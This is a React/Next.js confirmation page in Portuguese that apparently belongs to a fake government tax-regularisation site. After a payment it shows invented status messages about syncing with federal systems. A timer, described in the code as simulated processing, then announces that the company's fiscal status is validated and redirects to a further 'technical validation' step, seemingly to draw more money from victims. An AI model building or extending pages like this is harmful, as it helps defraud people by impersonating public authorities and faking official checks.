"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { CheckCircle } from "lucide-react"
import type { VerificationData, PaymentData } from "@/lib/types"
import { getCurrentDateTime } from "@/lib/utils"
import { Loading } from "@/components/loading"

export default function ConfirmacaoPage() {
  const router = useRouter()
  const [verificationData, setVerificationData] = useState<VerificationData | null>(null)
  const [paymentData, setPaymentData] = useState<PaymentData | null>(null)
  const [isLoading, setIsLoading] = useState(true)
  const [loadingMessages, setLoadingMessages] = useState<string[]>([
    "Processando pagamento...",
    "Atualizando status fiscal...",
    "Sincronizando com sistemas federais...",
    "Verificando pendências complementares...",
    "Consultando base nacional de conformidade...",
    "Validando etapas adicionais...",
  ])

  useEffect(() => {
    const storedVerificationData = sessionStorage.getItem("verificationData")
    const storedPaymentData = sessionStorage.getItem("paymentData")

    if (!storedVerificationData || !storedPaymentData) {
      router.push("/")
      return
    }

    const vData = JSON.parse(storedVerificationData) as VerificationData
    const pData = JSON.parse(storedPaymentData) as PaymentData

    setVerificationData(vData)
    setPaymentData(pData)

    // Simular processamento e redirecionamento para a próxima etapa
    setTimeout(() => {
      setIsLoading(false)

      // Após um breve momento mostrando a confirmação, redirecionar para a próxima etapa
      setTimeout(() => {
        router.push("/validacao-tecnica")
      }, 3000)
    }, 4000)
  }, [router])

  if (isLoading) {
    return (
      <div className="max-w-3xl mx-auto">
        <div className="gov-card">
          <Loading messages={loadingMessages} />
        </div>
      </div>
    )
  }

  if (!verificationData || !paymentData) {
    return null
  }

  return (
    <div className="max-w-3xl mx-auto">
      <div className="gov-card">
        <div className="flex flex-col items-center mb-6">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
            <CheckCircle className="h-10 w-10 text-green-600" />
          </div>
          <h1 className="text-2xl font-bold text-green-800 text-center">Pagamento confirmado com sucesso</h1>
          <p className="text-green-600 mt-2">
            A regularização fiscal da sua empresa foi validada às {getCurrentDateTime()}.
          </p>
          <p className="text-sm text-gray-600 mt-4">
            Aguarde enquanto verificamos pendências técnicas complementares...
          </p>
          <div className="w-full max-w-md mt-4 bg-gray-200 rounded-full h-2.5">
            <div className="bg-blue-600 h-2.5 rounded-full animate-pulse" style={{ width: "100%" }}></div>
          </div>
        </div>
      </div>
    </div>
  )
}
